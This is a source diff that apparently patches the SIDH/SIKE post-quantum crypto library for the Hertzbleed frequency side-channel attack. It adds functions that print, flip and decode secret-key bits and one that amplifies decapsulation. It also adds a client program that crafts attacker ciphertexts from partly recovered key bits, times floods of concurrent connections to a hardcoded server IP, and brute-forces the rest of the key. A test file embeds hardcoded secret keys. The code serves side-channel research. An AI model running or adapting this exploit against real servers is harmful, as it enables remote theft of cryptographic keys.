++const uint64_t xP3[2 * NWORDS64_FIELD] = { }; 
++const uint64_t yP3[2 * NWORDS64_FIELD] = { }; 
++
+          
+ const uint64_t p610[NWORDS64_FIELD]              = { 0xFFFFFFFFFFFFFFFF, 0xFFFFFFFFFFFFFFFF, 0xFFFFFFFFFFFFFFFF, 0xFFFFFFFFFFFFFFFF, 0x6E01FFFFFFFFFFFF, 
+                                                      0xB1784DE8AA5AB02E, 0x9AE7BF45048FF9AB, 0xB255B2FA10C4252A, 0x819010C251E7D88C, 0x000000027BF6A768 };
+diff -ruN '--exclude=.git' PQCrypto-SIDH/src/P610/P610_compressed.c PQCrypto-SIDH-modify-backup/src/P610/P610_compressed.c
+--- PQCrypto-SIDH/src/P610/P610_compressed.c	2022-06-05 15:34:06.276084139 -0500
++++ PQCrypto-SIDH-modify-backup/src/P610/P610_compressed.c	2022-02-23 16:44:30.861518154 -0600
+@@ -21,7 +21,12 @@
+ //
+ // Curve isogeny system "SIDHp610". Base curve: Montgomery curve By^2 = Cx^3 + Ax^2 + Cx defined over GF(p610^2), where A=6, B=1, C=1 and p610 = 2^305*3^192-1
+ //
+-         
++// Code from Yingchen
++const uint64_t xP2[2 * NWORDS64_FIELD] = { }; 
++const uint64_t yP2[2 * NWORDS64_FIELD] = { }; 
++const uint64_t xP3[2 * NWORDS64_FIELD] = { }; 
++const uint64_t yP3[2 * NWORDS64_FIELD] = { }; 
++        
+ const uint64_t p610[NWORDS64_FIELD]              = { 0xFFFFFFFFFFFFFFFF, 0xFFFFFFFFFFFFFFFF, 0xFFFFFFFFFFFFFFFF, 0xFFFFFFFFFFFFFFFF, 0x6E01FFFFFFFFFFFF, 
+                                                      0xB1784DE8AA5AB02E, 0x9AE7BF45048FF9AB, 0xB255B2FA10C4252A, 0x819010C251E7D88C, 0x000000027BF6A768 };
+ const uint64_t p610x2[NWORDS64_FIELD]            = { 0xFFFFFFFFFFFFFFFE, 0xFFFFFFFFFFFFFFFF, 0xFFFFFFFFFFFFFFFF, 0xFFFFFFFFFFFFFFFF, 0xDC03FFFFFFFFFFFF,
+diff -ruN '--exclude=.git' PQCrypto-SIDH/src/P751/P751.c PQCrypto-SIDH-modify-backup/src/P751/P751.c
+--- PQCrypto-SIDH/src/P751/P751.c	2022-06-05 15:34:06.284084193 -0500
++++ PQCrypto-SIDH-modify-backup/src/P751/P751.c	2022-02-23 16:44:01.577338971 -0600
+@@ -70,6 +70,29 @@
+ const uint64_t Montgomery_one[NWORDS64_FIELD]    = { 0x00000000000249ad, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x8310000000000000,
+                                                      0x5527b1e4375c6c66, 0x697797bf3f4f24d0, 0xc89db7b2ac5c4e2e, 0x4ca4b439d2076956, 0x10f7926c7512c7e9, 0x00002d5b24bce5e2 };
+ 
++// Code from Yingchen
++const uint64_t xP2[2 * NWORDS64_FIELD] = { 0x9C3BAC1D87F8B6FA, 0x9DECFAE8BFD643C8, 0xE6BC78A7F12FDCB0, 
++0x622F6BB801D0337E, 0xD5629AD0ECAD7C90, 0xB29ACB81E429BD1B, 0x24BFBBF6710D7DC8, 0x1F385FBBCC300BBB, 0x8AC0C0BDB2983805, 0xFA6004CA5B3637C6, 0x40F24874F8B87281, 0x00004514F8CC94B1,
++					    0xF0168D818AF02041, 0x653A8099CE5A84E4, 0x28D7A31EA0D54640, 
++0xAC494C60B8A0F65A, 0x3F9BB167DC01BE34, 0x5BCAC1897D262769, 0x8D971DA289DCF243, 0x77737EA6F8CC7493, 0xEA3CC16E10857540, 0xD6DD925F2D6E4F7F, 0x14B3A96CED5FDB37, 0x0000158ABF500B59 }; 
++
++const uint64_t yP2[2 * NWORDS64_FIELD] = {0x10A5708A70A0D5A8, 0x342F78098258DF2E, 0x96FFBB874FC587E4, 
++0xAE00627041C891BC, 0x2325BF8B0CF92E45, 0xAB876CF8DA8878F1, 0x9666DC1D40A2C0A3, 0x9E22B991D58FB2F8, 0xC83F84E2D9E6577F, 0x2A2B5A583C9F2DC6, 0x9A6EF66A2F1614AE, 0x00000BF6E4E7A28E, 
++					   0x53B4C5C42EB71F7E, 0x633C5AEAAB748338, 0x553916D62004FD21,
++0xACBF27BC1A127B4A, 0x2803F8D05BA3B1F2, 0xAC2B300A1C669D1A, 0xF6001FE9102D2597, 0x82302FBFB7E97153, 0xF9E4138703C6DB7C, 0xCF233FE387905BC8, 0x1DF80A53858519CB, 0x00001502FB44178D };
++
++const uint64_t xP3[2 * NWORDS64_FIELD] = {0xF827400E453432FE, 0xBEAB05F6023AF873, 0x20C13982FF5B49B8, 
++0x18760E9FDF67467E, 0xEF985AC0A5042600, 0xCA29CAA2FAA57174, 0x6E2F1FF7CE0C969C, 0x8EEE98E8F7CD6E21, 0x5D2F48123B6D9C49, 0x46DC12FF56D0C6F1, 0xC394B98024A55547, 0x0000605D4697A245, 
++                                          0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
++0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 
++					    0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000 }; 
++
++const uint64_t yP3[2 * NWORDS64_FIELD] = {0x99FC7F14FE720617, 0x2FF1CE313FEEEF41, 0x64EA2B6C1672A8CA, 
++0xB0D46CDC8CF9BA76, 0x712133D26502F17C, 0xD0FF57FF8093FE6B, 0x836F2C59A27BB61E, 0xBF295BB35F7B6D37, 0xBDF609628FD043B4, 0x9855E5BDD1435CFF, 0xC45E2FAA930D6258, 0x00005634690BFC14,
++                                          0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
++0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000 };                  
++                                                  
++
+ 
+ // Fixed parameters for isogeny tree computation
+ const unsigned int strat_Alice[MAX_Alice-1] = { 
+@@ -132,6 +155,15 @@
+ #define EphemeralKeyGeneration_B      EphemeralKeyGeneration_B_SIDHp751
+ #define EphemeralSecretAgreement_A    EphemeralSecretAgreement_A_SIDHp751
+ #define EphemeralSecretAgreement_B    EphemeralSecretAgreement_B_SIDHp751
++// Code from Yingchen
++#define crypto_kem_dec_amplification  crypto_kem_dec_amplification_SIKEp751
++#define crypto_printsecret            crypto_printsecret_SIKEp751
++#define crypto_printsecret_oneline    crypto_printsecret_oneline_SIKEp751
++#define crypto_target_swap            crypto_target_swap_SIKEp751
++#define crypto_sk_to_int              crypto_sk_to_int_SIKEp751
++#define crypto_generate_pub           crypto_generate_pub_SIKEp751
++#define crypto_flipsecret             crypto_flipsecret_SIKEp751
++// End
+ 
+ #include "../fpx.c"
+ #include "../ec_isogeny.c"
+diff -ruN '--exclude=.git' PQCrypto-SIDH/src/P751/P751_compressed.c PQCrypto-SIDH-modify-backup/src/P751/P751_compressed.c
+--- PQCrypto-SIDH/src/P751/P751_compressed.c	2022-06-05 15:34:06.284084193 -0500
++++ PQCrypto-SIDH-modify-backup/src/P751/P751_compressed.c	2022-02-23 16:44:21.481461351 -0600
+@@ -141,6 +141,11 @@
+ // Value one in Montgomery representation 
+ const uint64_t Montgomery_one[NWORDS64_FIELD]    = { 0x00000000000249ad, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x8310000000000000,
+                                                      0x5527b1e4375c6c66, 0x697797bf3f4f24d0, 0xc89db7b2ac5c4e2e, 0x4ca4b439d2076956, 0x10f7926c7512c7e9, 0x00002d5b24bce5e2 };
++// Code from Yingchen
++const uint64_t xP2[2 * NWORDS64_FIELD] = { }; 
++const uint64_t yP2[2 * NWORDS64_FIELD] = { }; 
++const uint64_t xP3[2 * NWORDS64_FIELD] = { }; 
++const uint64_t yP3[2 * NWORDS64_FIELD] = { }; 
+ 
+ // constant Montgomery_RB1 = (2^NBITS_ORDER)^2 mod Bob_order
+ const uint64_t Montgomery_RB1[NWORDS64_FIELD]     = { 0x1A55482318541298,0x70A6370DFA12A03,0xCB1658E0E3823A40,0xB3B7384EB5DEF3F9,0xCBCA952F7006EA33,0x569EF8EC94864C};
+diff -ruN '--exclude=.git' PQCrypto-SIDH/src/sike.c PQCrypto-SIDH-modify-backup/src/sike.c
+--- PQCrypto-SIDH/src/sike.c	2022-06-05 15:34:06.300084300 -0500
++++ PQCrypto-SIDH-modify-backup/src/sike.c	2022-02-23 16:43:31.637149973 -0600
+@@ -6,11 +6,184 @@
+ 
+ #include <string.h>
+ #include "sha3/fips202.h"
++#include <math.h>
+ 
+ #ifdef DO_VALGRIND_CHECK
+ #include <valgrind/memcheck.h>
+ #endif
+ 
++// Code from Yingchen
++// Generate public key given secret key
++int crypto_generate_pub(unsigned char *pk, unsigned char *sk)
++{   
++    // Generate public key pk
++    EphemeralKeyGeneration_B(sk + MSG_BYTES, pk);
++
++    // Append public key pk to secret key sk
++    memcpy(&sk[MSG_BYTES + SECRETKEY_B_BYTES], pk, CRYPTO_PUBLICKEYBYTES);
++
++#ifdef DO_VALGRIND_CHECK
++    VALGRIND_MAKE_MEM_DEFINED(sk, MSG_BYTES + SECRETKEY_B_BYTES);
++#endif
++    return 0;   
++}
++
++
++
++// Code from Yingchen
++// Print secret key
++int crypto_printsecret(unsigned char *sk)
++{   
++    
++    digit_t SecretKeyB[NWORDS_ORDER] = {0};
++    int nbits, bit;
++    if (BOB == ALICE) {
++        nbits = OALICE_BITS;
++    } else {
++        nbits = OBOB_BITS - 1;
++    }
++    
++    printf("Secret key %d\n", nbits);
++    printf("%d\n", SECRETKEY_B_BYTES);
++    decode_to_digits(sk + MSG_BYTES, SecretKeyB, SECRETKEY_B_BYTES, NWORDS_ORDER);
++     
++    for (int j = 0; j < nbits; j++) {
++        bit = (SecretKeyB[j >> LOG2RADIX] >> (j & (RADIX-1))) & 1;
++        printf("%d \n", bit);
++    } 
++    printf("\n");
++    return 0;
++}
++
++// Code from Yingchen
++// Print secret key in one line
++int crypto_printsecret_oneline(unsigned char *sk)
++{   
++    
++    digit_t SecretKeyB[NWORDS_ORDER] = {0};
++    int nbits, bit;
++    if (BOB == ALICE) {
++        nbits = OALICE_BITS;
++    } else {
++        nbits = OBOB_BITS - 1;
++    }
++    
++    printf("Secret key %d\n", nbits);
++    printf("%d\n", SECRETKEY_B_BYTES);
++    decode_to_digits(sk + MSG_BYTES, SecretKeyB, SECRETKEY_B_BYTES, NWORDS_ORDER);
++     
++    for (int j = 0; j < nbits; j++) {
++        bit = (SecretKeyB[j >> LOG2RADIX] >> (j & (RADIX-1))) & 1;
++        printf("%d ", bit);
++    } 
++    printf("\n");
++    return 0;
++}
++
++
++// Code from Yingchen
++// Flip secret key
++int crypto_flipsecret(unsigned char *sk, unsigned char *sk_flipped, int index)
++{   
++    
++    digit_t SecretKeyB[NWORDS_ORDER] = {0};
++    int nbits, bit;
++    if (BOB == ALICE) {
++        nbits = OALICE_BITS;
++    } else {
++        nbits = OBOB_BITS - 1;
++    }
++    
++    decode_to_digits(sk + MSG_BYTES, SecretKeyB, SECRETKEY_B_BYTES, NWORDS_ORDER);
++    
++    for (int j = 0; j < nbits; j++) {
++        bit = (SecretKeyB[j >> LOG2RADIX] >> (j & (RADIX-1))) & 1;
++
++        if(j == index){
++            if(bit == 1){
++            	SecretKeyB[j >> LOG2RADIX] = SecretKeyB[j >> LOG2RADIX] - (unsigned long)pow((double)2, (double)(j & (RADIX-1)));        	
++            }else{
++               SecretKeyB[j >> LOG2RADIX] = SecretKeyB[j >> LOG2RADIX] + (unsigned long)pow((double)2, (double)(j & (RADIX-1)));
++            }
++        }
++    } 
++    
++    encode_to_bytes(SecretKeyB, sk_flipped+MSG_BYTES, SECRETKEY_B_BYTES);
++    
++    return 0;
++}
++
++// Code from Yingchen
++// Get the value of the target swap
++int crypto_target_swap(unsigned char *sk, int index){
++    
++    digit_t SecretKeyB[NWORDS_ORDER] = {0};
++    int nbits;
++    if (BOB == ALICE) {
++        nbits = OALICE_BITS;
++    } else {
++        nbits = OBOB_BITS - 1;
++    }
++    
++    decode_to_digits(sk + MSG_BYTES, SecretKeyB, SECRETKEY_B_BYTES, NWORDS_ORDER);
++     
++    int bit, swap, prevbit = 0;
++    for (int j = 0; j < nbits; j++) {
++        bit = (SecretKeyB[j >> LOG2RADIX] >> (j & (RADIX-1))) & 1;
++        swap = bit ^ prevbit;
++        prevbit = bit;
++        if(j == index){
++            return swap;
++        }
++    }
++   
++    return 0;
++}
++
++// Code from Yingchen
++// char sk to its bit representation
++void crypto_sk_to_int(unsigned char *sk, int* sk_int){
++    
++    digit_t SecretKeyB[NWORDS_ORDER] = {0};
++    int nbits, bit;
++    if (BOB == ALICE) {
++        nbits = OALICE_BITS;
++    } else {
++        nbits = OBOB_BITS - 1;
++    }
++
++    decode_to_digits(sk + MSG_BYTES, SecretKeyB, SECRETKEY_B_BYTES, NWORDS_ORDER);
++    for (int j = 0; j < nbits; j++) {
++        bit = (SecretKeyB[j >> LOG2RADIX] >> (j & (RADIX-1))) & 1;
++        sk_int[j] = bit;
++    }
++
++}
++
++
++// Code from Yingchen
++// For Hertzbleed amplification. The function that generates Hertzbleed is EphemeralSecretAgreement_B. We can loop it for more AMPLIFICATION to see a better result. 
++int crypto_kem_dec_amplification(unsigned char *ss, const unsigned char *ct, const unsigned char *sk, int AMPLIFICATION)
++{ // SIKE's decapsulation with amplification
++  // Input:   secret key sk         (CRYPTO_SECRETKEYBYTES = MSG_BYTES + SECRETKEY_B_BYTES + CRYPTO_PUBLICKEYBYTES bytes)
++  //          ciphertext message ct (CRYPTO_CIPHERTEXTBYTES = CRYPTO_PUBLICKEYBYTES + MSG_BYTES bytes) 
++  // Outputs: shared secret ss      (CRYPTO_BYTES bytes)
++    unsigned char ephemeralsk_[SECRETKEY_A_BYTES];
++    unsigned char jinvariant_[FP2_ENCODED_BYTES];
++    unsigned char h_[MSG_BYTES];
++    unsigned char c0_[CRYPTO_PUBLICKEYBYTES];
++    unsigned char temp[CRYPTO_CIPHERTEXTBYTES+MSG_BYTES];
++#ifdef DO_VALGRIND_CHECK
++    VALGRIND_MAKE_MEM_UNDEFINED(sk, CRYPTO_SECRETKEYBYTES);
++#endif
++
++    // Decrypt
++    for (int i = 0; i < AMPLIFICATION; i++) {
++        EphemeralSecretAgreement_B(sk + MSG_BYTES, ct, jinvariant_);
++    }
++    
++    return 0;
++}
+ 
+ int crypto_kem_keypair(unsigned char *pk, unsigned char *sk)
+ { // SIKE's key generation
+diff -ruN '--exclude=.git' PQCrypto-SIDH/tests/client.c PQCrypto-SIDH-modify-backup/tests/client.c
+--- PQCrypto-SIDH/tests/client.c	1969-12-31 18:00:00.000000000 -0600
++++ PQCrypto-SIDH-modify-backup/tests/client.c	2022-02-23 16:57:29.833129939 -0600
+@@ -0,0 +1,219 @@
++// Code from Yingchen
++#include "../src/random/random.h"
++#include <stdio.h>	//printf
++#include <string.h>	//strlen
++#include <sys/socket.h>	//socket
++#include <arpa/inet.h>	//inet_addr
++#include <unistd.h>
++#include <stdlib.h>
++#include <time.h>
++#include <pthread.h>
++
++unsigned char ct[CRYPTO_CIPHERTEXTBYTES] = {0};
++
++void *connection_handler( )
++{
++	int sock;
++	struct sockaddr_in server;
++	char message[1000] , server_reply[6];
++	
++	// Create socket
++	sock = socket(AF_INET , SOCK_STREAM , 0);
++	if (sock == -1)
++	{
++		printf("Could not create socket");
++	}
++	
++	server.sin_addr.s_addr = inet_addr("130.126.136.241");
++	server.sin_family = AF_INET;
++	server.sin_port = htons( 9000 );
++
++	// Connect to remote server
++	if (connect(sock , (struct sockaddr *)&server , sizeof(server)) < 0)
++	{
++		perror("connect failed. Error");
++		return 1;
++	}
++		
++	if( send(sock , ct , CRYPTO_CIPHERTEXTBYTES , 0) < 0)
++	{
++		puts("Send failed");
++		return 1;
++	}
++		
++	// Receive a reply from the server
++	if( recv(sock , server_reply , 6 , 0) < 0)
++	{
++		puts("recv failed");
++	
++	}
++	
++	
++	close(sock);
++	
++	return 0;
++}
++
++
++int main(int argc , char *argv[])
++{
++    int target_bit = atoi(argv[1]);
++	
++    int connection = atoi(argv[2]);
++	
++    int iteration = atoi(argv[3]);
++
++    char* filename = argv[4];
++	
++    printf("target_bit %d\n", target_bit); 
++    printf("connection %d\n", connection); 
++    printf("iteration %d\n", iteration); 
++        	
++    int* sk_recovered = (int*) malloc( target_bit * sizeof(int) );
++    
++    FILE * fp;
++    char * line = NULL;
++    size_t len = 0;
++    ssize_t read;
++
++    fp = fopen(filename, "r");
++    if (fp == NULL){
++        printf("failed to open\n");
++        return 0;
++    }
++
++    int key_index = 0;
++    if(target_bit>0){
++        while ((read = getline(&line, &len, fp)) != -1) {
++            sk_recovered[key_index] = atoi(line);
++            key_index = key_index+1;
++            if(key_index == target_bit){
++                break;
++            }
++        }
++    }
++    fclose(fp);
++	
++    unsigned char sk[CRYPTO_SECRETKEYBYTES] = {0};
++    unsigned char pk[CRYPTO_PUBLICKEYBYTES] = {0};
++    crypto_kem_keypair(pk, sk);
++         
++    unsigned char ss[CRYPTO_BYTES] = {0};
++    crypto_kem_enc(ct, ss, pk);
++	
++    unsigned char fake_pk[CRYPTO_PUBLICKEYBYTES] = {0};
++	
++    // Prepare attacker ciphertext
++    prep_ct(sk_recovered, 378, target_bit, fake_pk);
++    memcpy(ct, fake_pk, CRYPTO_PUBLICKEYBYTES);
++	
++    // Get the public key
++    int sock;
++    struct sockaddr_in server;
++    char pubkey_query[5] = {'p', 'u', 'b', '?', '\0'};
++	
++    unsigned char server_pub[CRYPTO_PUBLICKEYBYTES];
++	
++    sock = socket(AF_INET , SOCK_STREAM , 0);
++    if (sock == -1)
++    {
++	    printf("Could not create socket");
++    }
++	
++    server.sin_addr.s_addr = inet_addr("130.126.136.241");
++    server.sin_family = AF_INET;
++    server.sin_port = htons( 9000 );
++
++    // Connect to remote server
++    if(connect(sock , (struct sockaddr *)&server , sizeof(server)) < 0)
++    {
++        perror("connect failed. Error");
++        return 1;
++    }
++	
++    if(send(sock , pubkey_query , 5 , 0) < 0)
++    {
++        puts("Send failed");
++        return 1;
++    }
++		
++    // Receive a reply from the server
++    if(recv(sock , server_pub , CRYPTO_PUBLICKEYBYTES , 0) < 0)
++    {
++	    puts("recv failed");
++    }
++	
++    close(sock);
++	
++    if(connection == 0){
++        char secretkey_query[8] = {'s', 'e', 'c', 'r', 'e', 't', '?','\0'};
++	    sock = socket(AF_INET , SOCK_STREAM , 0);
++        
++        if (connect(sock , (struct sockaddr *)&server , sizeof(server)) < 0)
++        {
++            perror("connect failed. Error");
++            return 1;
++        }
++        
++        if( send(sock , secretkey_query , 8, 0) < 0)
++        {
++            puts("Send failed");
++            return 1;
++        }
++            
++        close(sock);    
++        return 0;
++    }    	
++	
++    pthread_t* tids = (pthread_t*) malloc( connection * sizeof(pthread_t) );
++    for(int i =0; i<iteration; i++){
++        
++        struct timespec tstart={0,0}, tend={0,0};
++        clock_gettime(CLOCK_MONOTONIC, &tstart);
++	
++        for(int j =0; j<connection; j++){
++            pthread_create(&tids[j], NULL, connection_handler, NULL);	
++        }
++        
++        for (int j = 0; j < connection; j++){
++            pthread_join(tids[j], NULL);
++        }
++       
++        clock_gettime(CLOCK_MONOTONIC, &tend);
++        printf("sike took about %.5f seconds\n",
++           	((double)tend.tv_sec + 1.0e-9*tend.tv_nsec) - 
++           	((double)tstart.tv_sec + 1.0e-9*tstart.tv_nsec));
++           	
++    }
++    free(tids);
++
++
++    if(iteration == 0){
++        printf("Server real pub \n");
++        for(int j =0; j<CRYPTO_PUBLICKEYBYTES; j++){
++            printf("%d ", server_pub[j]);		
++        }
++	    printf("Server real pub end \n");
++	    
++        brute_secret(sk_recovered, server_pub, target_bit, 378);
++               
++        char secretkey_query[8] = {'s', 'e', 'c', 'r', 'e', 't', '?','\0'};
++	    sock = socket(AF_INET , SOCK_STREAM , 0);
++        
++        // Connect to remote server
++        if (connect(sock , (struct sockaddr *)&server , sizeof(server)) < 0)
++        {
++            perror("connect failed. Error");
++            return 1;
++        }
++	
++        if( send(sock , secretkey_query , 8, 0) < 0)
++        {
++            puts("Send failed");
++            return 1;
++        }
++		
++	    close(sock);        
++    }
++    return 0;
++}
+diff -ruN '--exclude=.git' PQCrypto-SIDH/tests/local.c PQCrypto-SIDH-modify-backup/tests/local.c
+--- PQCrypto-SIDH/tests/local.c	1969-12-31 18:00:00.000000000 -0600
++++ PQCrypto-SIDH-modify-backup/tests/local.c	2022-02-23 16:51:28.583618091 -0600
+@@ -0,0 +1,151 @@
++// Code from Yingchen
++#include "../src/random/random.h"
++#include <stdio.h>
++#include <stdlib.h>
++#include <sys/ioctl.h>
++#include <sys/poll.h>
++#include <sys/socket.h>
++#include <sys/time.h>
++#include <netinet/in.h>
++#include <errno.h>
++#include <pthread.h> //for threading , link with lpthread
++int amplification = 0;
++
++
++unsigned char sk1[CRYPTO_SECRETKEYBYTES] = {170, 209, 52, 191, 41, 143, 15, 29, 127, 215, 165, 206, 176, 105, 76, 96, 40, 211, 83, 4, 106, 47, 136, 245, 111, 8, 137, 32, 44, 16, 43, 254, 102, 176, 245, 119, 44, 31, 56, 172, 223, 214, 247, 100, 103, 16, 87, 253, 220, 74, 216, 139, 119, 237, 2, 188, 236, 32, 202, 90, 108, 194, 66, 92, 106, 117, 75, 160, 92, 230, 142, 180, 56, 221, 232, 227, 161, 37, 193, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
++unsigned char sk2[CRYPTO_SECRETKEYBYTES] = {201, 141, 123, 57, 34, 209, 25, 46, 39, 49, 134, 14, 91, 164, 69, 204, 249, 170, 62, 153, 62, 188, 38, 139, 63, 201, 172, 133, 64, 171, 244, 168, 3, 54, 254, 243, 89, 221, 9, 221, 230, 242, 46, 89, 183, 173, 225, 37, 205, 201, 217, 16, 137, 250, 232, 180, 169, 154, 127, 153, 112, 153, 213, 104, 124, 63, 113, 139, 128, 2, 209, 50, 88, 172, 136, 8, 98, 151, 94, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
